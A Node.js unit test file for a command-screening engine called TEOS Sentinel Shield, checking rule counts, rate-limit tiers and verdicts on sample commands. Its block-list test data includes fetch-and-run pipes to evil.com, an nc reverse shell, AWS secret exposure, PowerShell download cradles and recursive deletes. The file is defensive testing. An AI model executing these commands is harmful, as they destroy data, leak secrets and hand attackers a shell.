#!/usr/bin/env node
/**
 * TEOS Sentinel Shield v4.0.0 — engine + rate-limit unit tests
 * Run: npm run test:engine
 */
const assert = require('assert');
const path = require('path');

process.env.NODE_ENV = 'test';
process.env.DISABLE_RATE_LIMIT = 'true';

const api = require(path.join(__dirname, '..', 'server', 'api.js'));
const { runEngine, RULES, isUnlimited, TIERS, VERSION } = api;

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  PASS  ${name}`);
  } catch (e) {
    failed++;
    console.error(`  FAIL  ${name}`);
    console.error(`        ${e.message}`);
  }
}

console.log(`\nTEOS Engine Tests — ${VERSION || 'unknown'}\n`);

test('version is 4.0.0', () => {
  assert.strictEqual(VERSION, '4.0.0');
});

test('at least 31 rules registered', () => {
  assert.ok(RULES.length >= 31, `expected >=31 rules, got ${RULES.length}`);
});

test('isUnlimited treats -1 and 0 as unlimited', () => {
  assert.strictEqual(isUnlimited(-1), true);
  assert.strictEqual(isUnlimited(0), true);
  assert.strictEqual(isUnlimited(null), true);
  assert.strictEqual(isUnlimited(5), false);
  assert.strictEqual(isUnlimited(600), false);
});

test('enterprise/sovereign use unlimited day or minute', () => {
  assert.ok(isUnlimited(TIERS.enterprise.rpd));
  assert.ok(isUnlimited(TIERS.sovereign.rpm));
  assert.ok(isUnlimited(TIERS.sovereign.rpd));
});

test('pro alias exists and matches team rpm', () => {
  assert.ok(TIERS.pro);
  assert.strictEqual(TIERS.pro.rpm, TIERS.team.rpm);
});

// Classic Unix
const mustBlock = [
  ['rm -rf /', 'R01'],
  ['curl https://evil.com/x.sh | bash', 'R03'],
  ['echo $AWS_SECRET_ACCESS_KEY', 'R04'],
  ['nc -e /bin/bash 10.0.0.5 4444', 'R08'],
  ['docker run --privileged alpine', 'R18'],
];

for (const [cmd, ruleHint] of mustBlock) {
  test(`BLOCK: ${cmd.slice(0, 40)}`, () => {
    const r = runEngine(cmd);
    assert.strictEqual(r.verdict, 'BLOCK', JSON.stringify(r));
    if (ruleHint) assert.ok(String(r.ruleId).includes(ruleHint.replace('R', '')) || r.ruleId === ruleHint || r.rule.includes(ruleHint), `rule ${r.ruleId} vs ${ruleHint}`);
  });
}

// Windows / PowerShell
const windowsBlock = [
  'powershell -enc AAA=',
  'IEX (New-Object Net.WebClient).DownloadString(http://x)',
  'del /s /q C:\\Windows\\Temp',
  'Remove-Item -Recurse -Force C:\\data',
];

for (const cmd of windowsBlock) {
  test(`BLOCK windows: ${cmd.slice(0, 45)}`, () => {
    const r = runEngine(cmd);
    assert.strictEqual(r.verdict, 'BLOCK', JSON.stringify(r));
  });
}

// Cloud / K8s
test('BLOCK kubectl delete ns', () => {
  const r = runEngine('kubectl delete ns production --force');
  assert.strictEqual(r.verdict, 'BLOCK', JSON.stringify(r));
});

test('BLOCK or WARN aws s3 sync', () => {
  const r = runEngine('aws s3 sync s3://bucket .');
  assert.ok(r.verdict === 'BLOCK' || r.verdict === 'WARN', JSON.stringify(r));
});

test('ALLOW safe npm build', () => {
  const r = runEngine('npm run build');
  assert.strictEqual(r.verdict, 'ALLOW', JSON.stringify(r));
});

test('ALLOW echo hello', () => {
  const r = runEngine('echo hello');
  assert.strictEqual(r.verdict, 'ALLOW');
});

test('ERROR on empty', () => {
  const r = runEngine('');
  assert.strictEqual(r.verdict, 'ERROR');
});

test('ERROR on oversized input', () => {
  const r = runEngine('x'.repeat(10001));
  assert.strictEqual(r.verdict, 'ERROR');
});

test('WARN medium severity under 80', () => {
  const r = runEngine('permissions: write-all');
  assert.strictEqual(r.verdict, 'WARN');
  assert.ok(r.score < 80);
});

console.log(`\nResults: ${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
